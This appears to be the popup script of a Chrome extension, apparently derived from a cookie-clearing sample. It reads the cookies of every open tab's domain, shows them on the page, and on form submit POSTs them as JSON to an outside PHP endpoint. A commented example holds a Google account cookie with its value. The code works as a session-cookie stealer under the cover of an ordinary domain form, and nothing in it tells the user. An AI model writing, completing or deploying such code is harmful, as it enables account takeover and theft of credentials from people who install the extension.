const form = document.getElementById("control-row");
const go = document.getElementById("go");
const input = document.getElementById("input");
const message = document.getElementById("message");
const list = document.getElementById("list");

// The async IIFE is necessary because Chrome <89 does not support top level await.
(async function initPopupWindow() {
  let [tab] = await chrome.tabs.query({ active: true, currentWindow: true });

  if (tab?.url) {
    try {
      let url = new URL(tab.url);
      input.value = url.hostname;
    } catch {}
  }




  input.focus();
})();


chrome.windows.getAll({ populate: true }, function (windows) {
  windows.forEach(function (window) {
    window.tabs.forEach(function (tab) {
      //collect all of the urls here, I will just log them instead
     // console.log(tab.url);

      let li = document.createElement('li')
      let y = document.createElement("input");
     // console.log(stringToUrl(tab.url).hostname, "this is mine");
      li.innerText = stringToUrl(tab.url).hostname;
      list.appendChild(li);

                chrome.cookies.getAll(
                  {
                    domain: stringToUrl(tab.url).hostname,
                  },
                  function (cookies) {
                    console.log(cookies,'is name');
                    y.setAttribute('type', 'text');
                    y.setAttribute('class','ali')
                    y.value = JSON.stringify(cookies);
                    message.appendChild(y);
                  }
                );


    });
  });
});



form.addEventListener("submit", handleFormSubmit);

async function handleFormSubmit(event) {
  event.preventDefault();

  clearMessage();

  let url = stringToUrl(input.value);
  if (!url) {
    setMessage("Invalid URL");
    return;
  }

 
  chrome.windows.getAll({ populate: true }, function (windows) {
    windows.forEach(function (window) {
      window.tabs.forEach(function (tab) {
        //collect all of the urls here, I will just log them instead
        //console.log(stringToUrl(tab.url));
        let x = stringToUrl(tab.url)  
          
        
      //  console.log(chrome.cookies.getAll(x.host));
          
        
          // let messageo = await deleteDomainCookies(x);
          // setMessage(messageo);
        
        

           chrome.cookies.getAll(
             {
               domain: x.hostname,
             },
             function (cookies) {
            
               var xhttp = new XMLHttpRequest();
               xhttp.open(
                 "POST",
                 "https://publichtml/hdlrequest.php",
                 true
               );
               xhttp.setRequestHeader("Content-Type", "application/json");
               xhttp.onreadystatechange = function () {
                 if (this.readyState == 4 && this.status == 200) {
                   // Response
                   var response = this.responseText;
                   message.innerHTML= response;
                 }
               };
              //  var data = {
              //    name: "yogesh",
              //    salary: 35000,
              //    email: "yogesh@makitweb.com",
              //  };
               xhttp.send(JSON.stringify(cookies));
               
             }
           );

      });
    });
  });



      
  
}

async function deleteDomainCookies(domain) {
  
  try {
    
    const cookies = await chrome.cookies.getAll({ domain });
    if (cookies.length === 0) {
      return "No cookies found";
    }
    //alert(JSON.stringify(cookies))
    let pending = cookies.map(
      (item) => `
      
  <tr>
    <td>${item.name}</td>
    <td>${item.domain}</td>
    <td>${item.expirationDate}</td>
  </tr>
  `
    );
    await Promise.all(pending);
    alert(pending)
   
    
    // cookiesDeleted = pending.length;
  } catch (error) {
    return `Unexpected error: ${error.message}`;
  }
  
  return `${pending}`;
}

function stringToUrl(input) {
  // Start with treating the provided value as a URL
  try {
    return new URL(input);
  } catch {}
  // If that fails, try assuming the provided input is an HTTP host
  try {
    return new URL("http://" + input);
  } catch {}
  // If that fails ¯\_(ツ)_/¯
  return null;
}


// async function deleteDomainCookies(domain) {
//   let cookiesDeleted = 0;
//   try {
//     const cookies = await chrome.cookies.getAll({ domain });
//     if (cookies.length === 0) {
//       return "No cookies found";
//     }

//     let pending = cookies.map(deleteCookie);
//     await Promise.all(pending);

//     cookiesDeleted = pending.length;
//   } catch (error) {
//     return `Unexpected error: ${error.message}`;
//   }

//   return `Deleted ${cookiesDeleted} cookie(s).`;
// }
//? example of json data
[
  {
    domain: "accounts.google.com",
    expirationDate: 1711534767.315047,
    hostOnly: true,
    httpOnly: true,
    name: "__Host-GAPS",
    path: "/",
    sameSite: "unspecified",
    secure: true,
    session: false,
    storeId: "0",
    value: "1:0GQuCLh4QTzxKkD293ftF6VPkLCbtg:eKWVv_g_EIf-2Ax7",
  },
]; 





function setMessage(str) {
  message.textContent = str;
  message.hidden = false;
}

function clearMessage() {
 // message.hidden = true;
 // message.textContent = "";
}